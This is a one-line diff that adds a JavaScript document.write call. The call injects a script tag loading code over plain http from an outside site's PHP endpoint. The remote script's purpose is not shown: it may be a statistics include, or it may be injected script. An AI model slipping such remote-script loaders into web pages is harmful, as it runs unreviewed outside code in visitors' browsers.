@@ -1,0 +1,1 @@
+document.write("<script src='http://www.yubosun.com/akcms_inc.php?i=2275&stat=1'></script>")
